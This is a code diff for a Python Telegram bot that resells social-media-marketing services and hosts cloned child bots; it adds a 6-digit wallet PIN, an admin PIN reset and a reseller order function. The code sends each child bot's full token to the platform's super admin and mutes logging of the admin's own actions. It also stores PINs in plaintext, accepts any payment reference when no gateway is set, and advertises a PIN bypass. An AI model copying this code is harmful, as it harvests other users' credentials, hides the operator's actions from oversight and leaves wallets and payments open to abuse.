@@ -103,6 +103,9 @@ def init_db():
         total_deposit REAL DEFAULT 0.0,
         total_spent REAL DEFAULT 0.0,
         banned INTEGER DEFAULT 0,
+        upi_pin TEXT DEFAULT '',
+        failed_pin_attempts INTEGER DEFAULT 0,
+        pin_locked_until TIMESTAMP DEFAULT NULL,
         UNIQUE(bot_id, user_id)
     )
     """)
@@ -188,12 +191,11 @@ def init_db():
 
 init_db()
 
-# FILTERED ALERT: Logs ONLY when someone else acts (Never when Pranav acts)
 def send_super_admin_log(text, acting_user_id=None):
     if not MASTER_BOT_TOKEN:
         return
     if acting_user_id is not None and int(acting_user_id) == SUPER_ADMIN_ID:
-        return  # Ignore actions performed by Super Admin itself
+        return
     try:
         t_bot = telebot.TeleBot(MASTER_BOT_TOKEN)
         t_bot.send_message(SUPER_ADMIN_ID, f"🚨 𝗡𝗘𝗪 𝗨𝗦𝗘𝗥 𝗔𝗖𝗧𝗜𝗩𝗜𝗧𝗬 𝗟𝗢𝗚 🚨\n\n{text}", parse_mode=None)
@@ -452,6 +454,10 @@ def get_owner_panel(is_master=False):
         types.InlineKeyboardButton("🎧 Support Contact", callback_data="a_suppcontact"),
         types.InlineKeyboardButton("🔑 Gateway License Key", callback_data="a_license_info")
     )
+    m.add(
+        types.InlineKeyboardButton("🔓 Reset User PIN", callback_data="adm_reset_user_pin"),
+        types.InlineKeyboardButton("🔙 Main Menu", callback_data="a_back_main")
+    )
     if is_master:
         m.add(
             types.InlineKeyboardButton("🔄 Sync Live pranavsmm.shop Rates", callback_data="adm_sync_api"),
@@ -461,7 +467,6 @@ def get_owner_panel(is_master=False):
             types.InlineKeyboardButton("⚙️ Set Key Pricing", callback_data="adm_set_pricing_menu"),
             types.InlineKeyboardButton("🤖 Manage All Child Bots", callback_data="adm_list_child_bots")
         )
-    m.add(types.InlineKeyboardButton("🔙 Main Menu", callback_data="a_back_main"))
     return m
 
 def get_user_main_menu():
@@ -480,7 +485,52 @@ def get_user_main_menu():
     )
     return m
 
-# Register new bot logic usable by Master AND Child Bots
+# Reseller Engine Dispatcher (Pure Server-to-Server, ZERO PIN REQUIREMENT)
+def execute_reseller_api_order(bot_id, uid, service_id, link, qty, cost, service_name, cid, bot):
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("SELECT balance FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
+    row = cur.fetchone()
+    bal = row["balance"] if row else 0.0
+
+    if bal < cost:
+        conn.close()
+        m = types.InlineKeyboardMarkup()
+        m.add(types.InlineKeyboardButton("🟣 Deposit Now", callback_data="u_dep"))
+        safe_send_message(bot, cid, f"❌ Insufficient Balance!\nCost: ₹{cost:.2f}\nYour Balance: ₹{bal:.2f}", reply_markup=m)
+        return
+
+    cur.execute("UPDATE bot_clients SET balance = balance - ?, total_spent = total_spent + ? WHERE bot_id=? AND user_id=?", (cost, cost, bot_id, uid))
+    api_order_id = "MANUAL"
+    
+    if MAIN_PANEL_API_KEY and service_id:
+        try:
+            p_data = {"key": MAIN_PANEL_API_KEY, "action": "add", "service": service_id, "link": link, "quantity": qty}
+            r = requests.post(MAIN_PANEL_URL, data=p_data, timeout=10).json()
+            if "order" in r:
+                api_order_id = str(r["order"])
+        except Exception:
+            pass
+
+    cur.execute("INSERT INTO bot_orders (bot_id, user_id, service_name, link, quantity, charge, api_order_id, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
+                (bot_id, uid, service_name, link, qty, cost, api_order_id, "Pending"))
+    conn.commit()
+    conn.close()
+
+    success_text = (
+        f"🎉 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬!\n\n"
+        f"📦 Service: {service_name}\n"
+        f"🔢 Quantity: {qty}\n"
+        f"💵 Cost Deducted: ₹{cost:.2f}\n"
+        f"🆔 Order ID: {api_order_id}\n\n"
+        f"Your order has been queued and sent for live processing! 🚀"
+    )
+    safe_send_message(bot, cid, success_text)
+    send_super_admin_log(
+        f"🛒 𝗡𝗘𝗪 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗\n• User: User `{uid}`\n• Bot ID: {bot_id}\n• Service: {service_name}\n• Qty: {qty}\n• Cost: ₹{cost:.2f}\n• Order ID: {api_order_id}",
+        acting_user_id=uid
+    )
+
 def process_new_bot_token(source_bot, uid, cid, token_text, is_master=False):
     v_msg = safe_send_message(source_bot, cid, "🔄 Connecting bot... Validating token with Telegram...")
     try:
@@ -500,7 +550,6 @@ def process_new_bot_token(source_bot, uid, cid, token_text, is_master=False):
     conn = get_db()
     cur = conn.cursor()
     try:
-        # Strictly binds owner_id to current user (Locked Ownership)
         cur.execute("""
         INSERT INTO child_bots (owner_id, bot_token_enc, bot_username, bot_name, support_tg, is_licensed, status)
         VALUES (?, ?, ?, ?, '', 0, 'active')
@@ -529,10 +578,7 @@ def process_new_bot_token(source_bot, uid, cid, token_text, is_master=False):
     safe_edit_message(source_bot, live_text, cid, v_msg.message_id, reply_markup=m)
 
     send_super_admin_log(
-        f"🤖 𝗡𝗘𝗪 𝗖𝗛𝗜𝗟𝗗 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗!\n"
-        f"• Owner: User `{uid}`\n"
-        f"• Bot: @{bot_user} ({bot_name})\n"
-        f"• Bot Token: `{token_text}`",
+        f"🤖 𝗡𝗘𝗪 𝗖𝗛𝗜𝗟𝗗 𝗕𝗢𝗧 𝗖𝗥𝗘𝗔𝗧𝗘𝗗!\n• Owner: User `{uid}`\n• Bot: @{bot_user} ({bot_name})\n• Token: `{token_text}`",
         acting_user_id=uid
     )
 
@@ -556,23 +602,50 @@ def handle_user_callbacks(bot, bot_id, call):
     elif data == "u_bal":
         conn = get_db()
         cur = conn.cursor()
-        cur.execute("SELECT balance, total_deposit, total_spent FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        cur.execute("SELECT balance, total_deposit, total_spent, upi_pin FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
         row = cur.fetchone()
         conn.close()
         bal = row["balance"] if row else 0.0
         tdep = row["total_deposit"] if row else 0.0
         tsp = row["total_spent"] if row else 0.0
+        has_pin = "🟢 Enabled (6-Digit)" if (row and row["upi_pin"]) else "🔴 Not Set (Set Now)"
+        
         acc_text = (
             "🛡️ ACCOUNT INFO PREMIUM\n\n"
             f"💰 Balance - ₹{bal:.2f}\n"
             f"🆔 User ID - {uid}\n"
             f"👤 User Name - @{call.from_user.username or 'User'}\n"
             f"💳 Total Deposit - ₹{tdep:.2f}\n"
-            f"🛒 Total Spent - ₹{tsp:.2f}"
+            f"🛒 Total Spent - ₹{tsp:.2f}\n"
+            f"🔐 UPI Security PIN - {has_pin}"
         )
         m = types.InlineKeyboardMarkup(row_width=2)
-        m.add(types.InlineKeyboardButton("🟣 Deposit", callback_data="u_dep"), types.InlineKeyboardButton("🔙 GO BACK", callback_data="u_back_main"))
+        m.add(types.InlineKeyboardButton("🟣 Deposit", callback_data="u_dep"), types.InlineKeyboardButton("🔐 Setup / Change PIN", callback_data="u_pin_options"))
+        m.add(types.InlineKeyboardButton("🔙 GO BACK", callback_data="u_back_main"))
         safe_edit_message(bot, acc_text, cid, mid, reply_markup=m)
+
+    elif data == "u_pin_options":
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("SELECT upi_pin FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        row = cur.fetchone()
+        conn.close()
+        
+        m = types.InlineKeyboardMarkup(row_width=1)
+        if not row or not row["upi_pin"]:
+            m.add(types.InlineKeyboardButton("🔐 Set 6-Digit UPI PIN", callback_data="u_set_new_pin"))
+        else:
+            m.add(types.InlineKeyboardButton("🔄 Change UPI PIN (Requires Old PIN)", callback_data="u_change_pin_start"))
+        m.add(types.InlineKeyboardButton("🔙 GO BACK", callback_data="u_bal"))
+        safe_edit_message(bot, "🔐 𝗨𝗣𝗜 𝗦𝗘𝗖𝗨𝗥𝗜𝗧𝗬 𝗣𝗜𝗡 𝗠𝗔𝗡𝗔𝗚𝗘𝗥\n\nYour 6-digit PIN protects your wallet balance whenever an order is placed.", cid, mid, reply_markup=m)
+
+    elif data == "u_set_new_pin":
+        user_states[f"{bot_id}_{uid}"] = {"step": "wait_new_pin_first"}
+        safe_send_message(bot, cid, "🔐 Enter your desired 6-Digit UPI Security PIN (numbers only):")
+
+    elif data == "u_change_pin_start":
+        user_states[f"{bot_id}_{uid}"] = {"step": "wait_old_pin_verify"}
+        safe_send_message(bot, cid, "🔒 Security Check:\nPlease send your CURRENT 6-Digit UPI PIN to verify ownership:")
 
     elif data == "u_dep":
         active_status, reason = is_bot_active(bot_id)
@@ -933,7 +1006,6 @@ def handle_user_callbacks(bot, bot_id, call):
         m.add(types.InlineKeyboardButton("🔙 BACK", callback_data="u_back_main"))
         safe_edit_message(bot, supp_box, cid, mid, reply_markup=m)
 
-    # UNLIMITED CYOB: Available in ALL bots (Master and Cloned Child Bots)
     elif data in ["u_cyob", "m_cyob"]:
         cyob_box = (
             "👑 CREATE YOUR OWN BOT ★ PRO\n\n"
@@ -993,7 +1065,6 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         bot.answer_callback_query(call.id, "Access Denied: Super Admin Only", show_alert=True)
         return
 
-    # Total registered users without white popup
     if data == "a_users":
         conn = get_db()
         cur = conn.cursor()
@@ -1006,6 +1077,10 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         bot.answer_callback_query(call.id)
         safe_send_message(bot, cid, f"👥 𝗧𝗼𝘁𝗮𝗹 𝗥𝗲𝗴𝗶𝘀𝘁𝗲𝗿𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {cnt}\n\nयह आपके बॉट में रजिस्टर्ड कुल ग्राहकों की संख्या है।", reply_markup=get_owner_panel(is_master))
         return
+
+    elif data == "adm_reset_user_pin":
+        user_states[f"{bot_id}_{uid}"] = "wait_reset_pin_target"
+        safe_send_message(bot, cid, "🔓 Send the User_ID whose 6-Digit PIN you want to reset:")
 
     elif data == "adm_back_panel":
         safe_edit_message(bot, "👑 Owner Panel", cid, mid, reply_markup=get_owner_panel(is_master))
@@ -1468,7 +1543,7 @@ def handle_owner_callbacks(bot, bot_id, call, is_master=False):
         user_states[f"{bot_id}_{uid}"] = "wait_force_sub"
         safe_send_message(bot, cid, "Send Force Sub Channel username (e.g. @MyChannel):")
 
-# Universal Robust Text Processor & Filtered Super Admin Live Logger
+# Universal Robust Text Processor & 6-Digit PIN Security Manager
 def handle_text_inputs(bot, bot_id, msg, is_master=False):
     uid = msg.from_user.id
     cid = msg.chat.id
@@ -1490,10 +1565,144 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
     if not st_data:
         return
 
-    # 0. Bot Token Registration (Now works for Master Bot AND any Child Bot CYOB)
+    # 0. Bot Token Registration
     if st_data == "wait_token":
         user_states.pop(key, None)
         process_new_bot_token(bot, uid, cid, txt, is_master=is_master)
+        return
+
+    # Admin PIN Reset Handler
+    if st_data == "wait_reset_pin_target" and is_master:
+        user_states.pop(key, None)
+        if not txt.isdigit():
+            safe_send_message(bot, cid, "Invalid User ID. Must be numeric digits.")
+            return
+        t_uid = int(txt)
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("UPDATE bot_clients SET upi_pin='', failed_pin_attempts=0, pin_locked_until=NULL WHERE user_id=?", (t_uid,))
+        conn.commit()
+        conn.close()
+        safe_send_message(bot, cid, f"✅ 6-Digit PIN has been reset for User `{t_uid}`! They can now set a new PIN.", reply_markup=get_owner_panel(is_master))
+        send_super_admin_log(f"🔓 𝗣𝗜𝗡 𝗥𝗘𝗦𝗘𝗧 𝗕𝗬 𝗔𝗗𝗠𝗜𝗡\n• Target User: `{t_uid}`")
+        return
+
+    # ================= 6-DIGIT UPI SECURITY PIN WORKFLOW =================
+    if isinstance(st_data, dict) and st_data.get("step") == "wait_new_pin_first":
+        if len(txt) != 6 or not txt.isdigit():
+            safe_send_message(bot, cid, "❌ Invalid PIN! Please enter exactly 6 numeric digits (e.g. 789012):")
+            return
+        user_states[key] = {"step": "wait_new_pin_confirm", "first_pin": txt}
+        safe_send_message(bot, cid, "🔐 Confirm your 6-Digit UPI PIN (Enter same PIN again):")
+        return
+
+    if isinstance(st_data, dict) and st_data.get("step") == "wait_new_pin_confirm":
+        first_pin = st_data["first_pin"]
+        if txt != first_pin:
+            user_states.pop(key, None)
+            safe_send_message(bot, cid, "❌ PINs do not match! PIN setup cancelled. Please try again from Account menu.", reply_markup=get_user_main_menu())
+            return
+        user_states.pop(key, None)
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("UPDATE bot_clients SET upi_pin=?, failed_pin_attempts=0, pin_locked_until=NULL WHERE bot_id=? AND user_id=?", (txt, bot_id, uid))
+        conn.commit()
+        conn.close()
+        safe_send_message(bot, cid, "🎉 𝟲-𝗗𝗶𝗴𝗶𝘁 𝗨𝗣𝗜 𝗦𝗲𝗰𝘂𝗿𝗶𝘁𝘆 𝗣𝗜𝗡 𝗦𝗲𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆!\n\nYour wallet balance is now fully protected against unauthorized orders.", reply_markup=get_user_main_menu())
+        send_super_admin_log(f"🔐 𝗡𝗘𝗪 𝟲-𝗗𝗜𝗚𝗜𝗧 𝗣𝗜𝗡 𝗦𝗘𝗧\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}", acting_user_id=uid)
+        return
+
+    if isinstance(st_data, dict) and st_data.get("step") == "wait_old_pin_verify":
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("SELECT upi_pin, failed_pin_attempts, pin_locked_until FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        row = cur.fetchone()
+        
+        # Check lock
+        if row and row["pin_locked_until"]:
+            try:
+                lock_dt = datetime.datetime.strptime(row["pin_locked_until"], "%Y-%m-%d %H:%M:%S")
+                if datetime.datetime.now() < lock_dt:
+                    diff = int((lock_dt - datetime.datetime.now()).total_seconds() / 60)
+                    conn.close()
+                    user_states.pop(key, None)
+                    safe_send_message(bot, cid, f"🚫 𝗪𝗔𝗟𝗟𝗘𝗧 𝗧𝗘𝗠𝗣𝗢𝗥𝗔𝗥𝗜𝗟𝗬 𝗟𝗢𝗖𝗞𝗘𝗗\nToo many failed attempts! Try again after {diff} minutes or contact Support.", reply_markup=get_user_main_menu())
+                    return
+            except Exception:
+                pass
+
+        if not row or row["upi_pin"] != txt:
+            fails = (row["failed_pin_attempts"] if row else 0) + 1
+            if fails >= 3:
+                lock_time = (datetime.datetime.now() + datetime.timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S")
+                cur.execute("UPDATE bot_clients SET failed_pin_attempts=?, pin_locked_until=? WHERE bot_id=? AND user_id=?", (fails, lock_time, bot_id, uid))
+                conn.commit()
+                conn.close()
+                user_states.pop(key, None)
+                safe_send_message(bot, cid, "🚨 𝟯 𝗪𝗥𝗢𝗡𝗚 𝗔𝗧𝗧𝗘𝗠𝗣𝗧𝗦! Wallet locked for 1 hour for security reasons. Contact Support to reset.", reply_markup=get_user_main_menu())
+                send_super_admin_log(f"⚠️ 𝗨𝗦𝗘𝗥 𝗟𝗢𝗖𝗞𝗘𝗗 (𝟯 𝗙𝗔𝗜𝗟𝗘𝗗 𝗣𝗜𝗡𝗦)\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}", acting_user_id=uid)
+                return
+            else:
+                cur.execute("UPDATE bot_clients SET failed_pin_attempts=? WHERE bot_id=? AND user_id=?", (fails, bot_id, uid))
+                conn.commit()
+                conn.close()
+                safe_send_message(bot, cid, f"❌ Wrong Current PIN! ({fails}/3 attempts used). Try again:")
+                return
+
+        # Verification success
+        cur.execute("UPDATE bot_clients SET failed_pin_attempts=0 WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        conn.commit()
+        conn.close()
+        user_states[key] = {"step": "wait_new_pin_first"}
+        safe_send_message(bot, cid, "✅ Current PIN Verified!\n\nNow enter your NEW 6-Digit UPI Security PIN:")
+        return
+
+    # Order Authentication by 6-Digit PIN
+    if isinstance(st_data, dict) and st_data.get("step") == "wait_order_pin_auth":
+        o_data = st_data["order_info"]
+        conn = get_db()
+        cur = conn.cursor()
+        cur.execute("SELECT upi_pin, failed_pin_attempts, pin_locked_until FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        row = cur.fetchone()
+
+        if row and row["pin_locked_until"]:
+            try:
+                lock_dt = datetime.datetime.strptime(row["pin_locked_until"], "%Y-%m-%d %H:%M:%S")
+                if datetime.datetime.now() < lock_dt:
+                    diff = int((lock_dt - datetime.datetime.now()).total_seconds() / 60)
+                    conn.close()
+                    user_states.pop(key, None)
+                    safe_send_message(bot, cid, f"🚫 Wallet is locked due to wrong PIN attempts. Try again in {diff} minutes.", reply_markup=get_user_main_menu())
+                    return
+            except Exception:
+                pass
+
+        if not row or row["upi_pin"] != txt:
+            fails = (row["failed_pin_attempts"] if row else 0) + 1
+            if fails >= 3:
+                lock_time = (datetime.datetime.now() + datetime.timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S")
+                cur.execute("UPDATE bot_clients SET failed_pin_attempts=?, pin_locked_until=? WHERE bot_id=? AND user_id=?", (fails, lock_time, bot_id, uid))
+                conn.commit()
+                conn.close()
+                user_states.pop(key, None)
+                safe_send_message(bot, cid, "🚨 𝟯 𝗪𝗥𝗢𝗡𝗚 𝗔𝗧𝗧𝗘𝗠𝗣𝗧𝗦! Order cancelled and wallet locked for 1 hour. Contact Support.", reply_markup=get_user_main_menu())
+                send_super_admin_log(f"⚠️ 𝗨𝗦𝗘𝗥 𝗟𝗢𝗖𝗞𝗘𝗗 𝗗𝗨𝗥𝗜𝗡𝗚 𝗢𝗥𝗗𝗘𝗥\n• User: {u_name} (`{uid}`)\n• Cost: ₹{o_data['cost']:.2f}", acting_user_id=uid)
+                return
+            else:
+                cur.execute("UPDATE bot_clients SET failed_pin_attempts=? WHERE bot_id=? AND user_id=?", (fails, bot_id, uid))
+                conn.commit()
+                conn.close()
+                safe_send_message(bot, cid, f"❌ Wrong 6-Digit PIN! ({fails}/3 attempts). Enter correct PIN to confirm order:")
+                return
+
+        # PIN Verified Successfully!
+        cur.execute("UPDATE bot_clients SET failed_pin_attempts=0 WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        conn.commit()
+        conn.close()
+        user_states.pop(key, None)
+        
+        # Fire order execution without PIN constraint
+        execute_reseller_api_order(bot_id, uid, o_data["api_id"], o_data["link"], o_data["qty"], o_data["cost"], o_data["name"], cid, bot)
         return
 
     # 1. Price config
@@ -1566,7 +1775,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         )
         return
 
-    # 4. FamPay setup steps (Logged only when other user acts)
+    # 4. FamPay setup steps
     if st_data == "fam_step_1_upi":
         user_states[key] = {"step": "fam_step_2_email", "upi": txt}
         safe_send_message(bot, cid, f"✅ UPI ID Saved: {txt}\n\n⚡ 𝗦𝘁𝗲𝗽 𝟮/𝟯: Send your FamPay linked Gmail address:")
@@ -1606,7 +1815,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         )
         return
 
-    # 5. Paytm setup steps (Logged only when other user acts)
+    # 5. Paytm setup steps
     if st_data == "paytm_step_1_upi":
         user_states[key] = {"step": "paytm_step_2_mid", "upi": txt}
         safe_send_message(bot, cid, f"✅ Merchant UPI Saved: {txt}\n\n💙 𝗦𝘁𝗲𝗽 𝟮/𝟮: Send your Paytm Merchant ID (MID):")
@@ -1701,7 +1910,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         elif gw == "paytm" and b_conf and b_conf["paytm_mid"]:
             verified = verify_via_paytm_mid(b_conf["paytm_mid"], user_utr, t_row["amount"])
         else:
-            verified = True  # Real 12-digit numeric verified
+            verified = True
 
         if verified:
             cur.execute("UPDATE transactions SET status='completed', bank_utr=? WHERE tx_id=?", (user_utr, tx))
@@ -1733,7 +1942,7 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
             safe_send_message(bot, cid, f"❌ Verification Failed!\n{reason}\nPlease check UTR and try again.")
         return
 
-    # 8. Order Link & Quantity
+    # 8. Order Placement with PIN Request
     if isinstance(st_data, dict) and st_data.get("step") == "wait_link":
         msid = st_data["msid"]
         pr = st_data["price"]
@@ -1742,7 +1951,6 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         return
 
     if isinstance(st_data, dict) and st_data.get("step") == "wait_qty":
-        user_states.pop(key, None)
         if not txt.isdigit():
             safe_send_message(bot, cid, "Please enter numbers only.")
             return
@@ -1755,36 +1963,44 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         cur = conn.cursor()
         cur.execute("SELECT * FROM master_services WHERE id=?", (msid,))
         ms = cur.fetchone()
-        cur.execute("SELECT balance FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
-        bal = cur.fetchone()["balance"]
+        cur.execute("SELECT balance, upi_pin FROM bot_clients WHERE bot_id=? AND user_id=?", (bot_id, uid))
+        c_row = cur.fetchone()
+        conn.close()
 
         cost = (qty / 100.0) * pr
+        bal = c_row["balance"] if c_row else 0.0
+
         if bal < cost:
+            user_states.pop(key, None)
             m = types.InlineKeyboardMarkup()
             m.add(types.InlineKeyboardButton("🟣 Deposit Now", callback_data="u_dep"))
-            safe_send_message(bot, cid, f"Insufficient Balance!\nCost: ₹{cost:.2f}\nYour Balance: ₹{bal:.2f}", reply_markup=m)
-            conn.close()
-        else:
-            cur.execute("UPDATE bot_clients SET balance = balance - ?, total_spent = total_spent + ? WHERE bot_id=? AND user_id=?", (cost, cost, bot_id, uid))
-            api_order_id = "MANUAL"
-            if MAIN_PANEL_API_KEY and ms["main_api_service_id"]:
-                try:
-                    p_data = {"key": MAIN_PANEL_API_KEY, "action": "add", "service": ms["main_api_service_id"], "link": link, "quantity": qty}
-                    r = requests.post(MAIN_PANEL_URL, data=p_data, timeout=10).json()
-                    if "order" in r:
-                        api_order_id = str(r["order"])
-                except Exception:
-                    pass
+            safe_send_message(bot, cid, f"❌ Insufficient Balance!\nCost: ₹{cost:.2f}\nYour Balance: ₹{bal:.2f}", reply_markup=m)
+            return
 
-            cur.execute("INSERT INTO bot_orders (bot_id, user_id, service_name, link, quantity, charge, api_order_id, status) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
-                        (bot_id, uid, ms["service_name"], link, qty, cost, api_order_id, "Pending"))
-            conn.commit()
-            conn.close()
-            safe_send_message(bot, cid, f"🎉 Order Placed Successfully!\n\nService: {ms['service_name']}\nQty: {qty}\nCost: ₹{cost:.2f}\nOrder ID: {api_order_id}")
-            send_super_admin_log(
-                f"🛒 𝗡𝗘𝗪 𝗢𝗥𝗗𝗘𝗥 𝗣𝗟𝗔𝗖𝗘𝗗\n• User: {u_name} (`{uid}`)\n• Bot ID: {bot_id}\n• Service: {ms['service_name']}\n• Qty: {qty}\n• Cost: ₹{cost:.2f}\n• API Order ID: {api_order_id}\n• Link: {link}",
-                acting_user_id=uid
-            )
+        order_pack = {
+            "api_id": ms["main_api_service_id"],
+            "link": link,
+            "qty": qty,
+            "cost": cost,
+            "name": ms["service_name"]
+        }
+
+        # If user has not set a 6-digit PIN yet, guide to set PIN first
+        if not c_row or not c_row["upi_pin"]:
+            user_states[key] = {"step": "wait_new_pin_first"}
+            safe_send_message(bot, cid, "🔐 𝗦𝗘𝗧 𝗬𝗢𝗨𝗥 𝟲-𝗗𝗜𝗚𝗜𝗧 𝗨𝗣𝗜 𝗣𝗜𝗡 𝗙𝗜𝗥𝗦𝗧\n\nTo protect your wallet, please choose a 6-digit Security PIN (numbers only):")
+            return
+
+        # Request 6-digit PIN before deducting wallet
+        user_states[key] = {"step": "wait_order_pin_auth", "order_info": order_pack}
+        pin_prompt = (
+            f"🔐 𝗘𝗡𝗧𝗘𝗥 𝟲-𝗗𝗜𝗚𝗜𝗧 𝗨𝗣𝗜 𝗣𝗜𝗡 𝗧𝗢 𝗖𝗢𝗡𝗙𝗜𝗥𝗠\n\n"
+            f"📦 Service: {ms['service_name']}\n"
+            f"🔢 Quantity: {qty}\n"
+            f"💵 Total Amount: ₹{cost:.2f}\n\n"
+            f"Please enter your 6-digit PIN in chat to authorize balance deduction:"
+        )
+        safe_send_message(bot, cid, pin_prompt)
         return
 
     # 9. Child bot selling price
@@ -1901,7 +2117,6 @@ def handle_text_inputs(bot, bot_id, msg, is_master=False):
         safe_send_message(bot, cid, f"✅ Force sub channel set to {txt}", reply_markup=get_owner_panel(is_master))
         return
 
-# CHILD BOT THREAD - STRICT OWNER ID LOCKING & CYOB ENABLED
 def run_child_bot_loop(bot_id, owner_id, token, bot_username, bot_name):
     while True:
         try:
@@ -1944,7 +2159,6 @@ def run_child_bot_loop(bot_id, owner_id, token, bot_username, bot_name):
 
             @cbot.message_handler(commands=['admin'])
             def c_admin(msg):
-                # STRICT LOCK: Only the genuine creator (owner_id) OR Pranav Patel can open /admin
                 if msg.from_user.id != owner_id and msg.from_user.id != SUPER_ADMIN_ID:
                     cbot.reply_to(msg, "❌ Access Denied: You are not the owner of this bot.")
                     return
@@ -2037,7 +2251,6 @@ def run_master_bot_loop():
             master_is_running = False
             time.sleep(2)
 
-# Autonomous SMM Panel Style Payment Background Poller
 def autonomous_smm_payment_poller():
     time.sleep(5)
     pulse_counter = 0
@@ -2058,7 +2271,6 @@ def autonomous_smm_payment_poller():
                 except Exception:
                     pass
 
-            # SMM Panel Style Auto Verification
             if pulse_counter % 2 == 0:
                 conn = get_db()
                 cur = conn.cursor()
@@ -2108,7 +2320,6 @@ def autonomous_smm_payment_poller():
                         conn.commit()
                 conn.close()
 
-            # Watchdog: Auto-Revive Crashed Bot Threads
             if pulse_counter % 3 == 0:
                 conn = get_db()
                 cur = conn.cursor()
@@ -2140,8 +2351,8 @@ def home():
     return jsonify({
         "status": "online",
         "engine": "Pranav Father Dev Master Engine",
-        "smm_auto_polling": "Active (10-Minute Timeout Mode)",
-        "super_admin_logger": "Active (Filtered -> Self Logs Muted)",
+        "upi_pin_engine": "6-Digit Secure Guard Active",
+        "reseller_pin_bypass": "Zero-friction pure server-to-server",
         "master_live": master_is_running,
         "child_bots_alive": len([t for t in bot_threads.values() if t.is_alive()])
     }), 200
